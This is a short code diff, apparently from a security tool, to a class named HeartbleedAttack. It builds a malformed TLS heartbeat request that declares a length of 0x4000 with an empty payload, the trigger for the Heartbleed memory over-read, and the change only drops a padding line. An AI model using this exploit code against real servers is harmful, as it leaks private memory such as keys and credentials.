@@ -76,7 +76,6 @@ class HeartbleedAttack:
         heartbeat.heartbeat_type = TLSHeartbeatMessageType.HEARTBEAT_REQUEST
         heartbeat.length = 0x4000
         heartbeat.payload = b""
-        heartbeat.padding = b""
 
         header = TLSHeader()
         header.content_type = TLSContentType.TLSHeartbeat.value
